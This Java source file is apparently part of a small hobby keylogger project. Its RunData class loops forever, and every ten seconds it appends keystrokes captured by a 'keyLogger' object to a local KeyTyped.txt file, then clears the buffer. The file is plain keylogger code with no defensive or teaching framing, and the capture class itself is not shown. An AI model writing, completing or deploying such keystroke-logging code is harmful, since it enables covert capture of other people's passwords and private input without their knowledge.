/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package javaapplication2;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author mathieu
 */
public class RunData implements Runnable {

    
    
    @Override
    public void run() {
        
        JavaApplication2 keyLogger = new JavaApplication2();
        while(true) {
            String content = "";
            try {
                Thread.sleep(10000);
                File file = new File("./KeyTyped.txt");
                if(!file.exists()) {
                    file.createNewFile();
                }
                BufferedReader reader = new BufferedReader(new FileReader(file));
                String line;
                StringBuilder sb = new StringBuilder();
                while((line = reader.readLine()) != null) {
                    sb.append(line + "\n");
                }
                content = sb.toString();
                PrintWriter pw = new PrintWriter(file);
                pw.println(content + keyLogger.getKeyTyped());
                pw.flush();
                keyLogger.clearKeyTyped();
            } catch (InterruptedException ex) {
                Logger.getLogger(RunData.class.getName()).log(Level.SEVERE, null, ex);
            } catch (FileNotFoundException ex) {
                Logger.getLogger(RunData.class.getName()).log(Level.SEVERE, null, ex);
            } catch (IOException ex) {
                Logger.getLogger(RunData.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }

    
}
